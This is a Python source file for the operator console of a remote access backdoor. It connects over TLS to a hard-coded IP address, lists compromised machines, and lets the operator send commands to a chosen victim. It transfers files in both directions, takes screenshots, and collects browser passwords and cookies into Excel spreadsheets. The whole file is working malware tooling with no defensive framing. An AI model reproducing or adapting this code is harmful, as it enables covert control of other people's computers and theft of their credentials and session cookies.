import socket,json,base64
import pandas as pd
import datetime
import ssl

class Listener:
    def __init__(self,ip,port):
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.context.load_verify_locations("ca.crt")
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection= self.context.wrap_socket(self.connection, server_hostname='backdoor')
        self.ip=ip
        self.port=port
        self.connection.connect((ip,port))
        self.reliable_send("sher")
    
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    def reliable_receive(self):
        json_data="" 
        while True:
            try:
                json_data=json_data+self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def execute_remotely(self,command):
        self.reliable_send(command)
        if command=="exit":
            self.connection.close()
            exit()
        return self.reliable_receive()
    
    def write_file(self,path,content):
        content=base64.b64decode(content)
        with open(path,"wb") as file:
            file.write(content)
            return "[+] Download successful"
    
    def read_file(self, path):
        with open(path, "rb") as file:
            binary_data = file.read()
            return base64.b64encode(binary_data).decode("utf-8")
    
    def create_excel(self,data,type):
        if type=="passwords":
            df=pd.DataFrame(data,columns=["browser_name","url",'username','password'])
            # df.to_csv('passwords.')
            df.to_excel("password.xlsx",index=False)
            return "[+] Passwords Downloaded Successfully"
        elif type=="cookies":
            df=pd.DataFrame(data,columns=["browser_name","host_key",'name','cookie','creation_utc','last_access_utc','expires_utc'])
            df.to_excel("cookies.xlsx",index=False)
            return '[+] Cookies Download Suceessfully'
        return data 
    
    def control_bakara(self):
        while True:
            try:
                command=input(">> ")
                command=command.split(" ")
                if command[0]=="upload":
                    file_content=self.read_file(command[1])
                    command.append(file_content)
                elif command[0]=="change_bakara":
                    self.reliable_send(command)
                    self.run()
                result=self.execute_remotely(command)
                if command[0]=="download":
                    result=self.write_file(command[1],result.encode())
                elif command[0]=="screenshot":
                    current_time=datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
                    result=self.write_file("screenshot"+current_time+".png",result.encode())
                elif command[0]=="browser":
                    result=self.create_excel(result,command[1])
            except Exception as e:
                result="[-]Sher ERR : \n" + str(e)
            print(result)
    
    def run(self):
        while True:
            try:
                active_bakare=self.reliable_receive()
                if type(active_bakare)!=list:
                    print(active_bakare)
                else:
                    length=len(active_bakare)
                    print("Choose a bakara to control")
                    for i in range(length):
                        print(str(i+1) + ". " + str(active_bakare[i]))
                    print(active_bakare)
                    while True:
                        try:
                            n=int(input(">> "))-1
                        except:
                            print("[-] Enter a Integer value only")
                            continue
                        if n<=length and n>=0:
                            print(active_bakare[n])
                            self.reliable_send(active_bakare[n])
                            self.control_bakara()
                        else:
                            print("[-] Invalid choice")
            except Exception as e:
                print("[-] Error during command execution from server side\n\n" + str(e))
        

my_listener=Listener("98.70.78.176",8080)
# my_listener=Listener("localhost",4444)
my_listener.run()